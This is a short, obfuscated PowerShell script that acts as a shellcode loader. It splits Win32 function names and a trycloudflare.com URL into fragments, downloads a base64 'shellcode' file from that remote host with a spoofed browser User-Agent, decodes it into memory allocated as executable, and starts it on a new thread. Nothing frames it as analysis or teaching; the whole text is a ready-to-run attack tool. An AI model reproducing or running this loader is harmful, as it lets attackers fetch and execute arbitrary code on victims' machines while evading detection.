$a="Virt"+"ualA"+"lloc";$b="Crea"+"teTh"+"read";$c="Wait"+"ForS"+"ingleObj"+"ect"
$d=@"
[DllImport("kernel32")]public static extern IntPtr $a(IntPtr a,uint b,uint c,uint d);
[DllImport("kernel32")]public static extern IntPtr $b(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);
[DllImport("kernel32")]public static extern uint $c(IntPtr a,uint b);
"@
$k=Add-Type -MemberDefinition $d -Name "W" -PassThru
$u="htt"+"ps:/"+"/exch"+"ange-cla"+"ssified"+"-lace"+"-inches"+".trycloud"+"flare.com"+"/pay"+"loads/"+"shell"+"code.txt?key=PLACEHOLDER_TOKEN"
$w=New-Object Net.WebClient
$w.Headers.Add("User-Agent","Mozilla/5.0")
$x=[Convert]::FromBase64String($w.DownloadString($u))
$m=$k::$a([IntPtr]::Zero,$x.Length,0x3000,0x40)
[Runtime.InteropServices.Marshal]::Copy($x,0,$m,$x.Length)
$t=$k::$b([IntPtr]::Zero,0,$m,[IntPtr]::Zero,0,[IntPtr]::Zero)
$k::$c($t,0xFFFFFFFF)
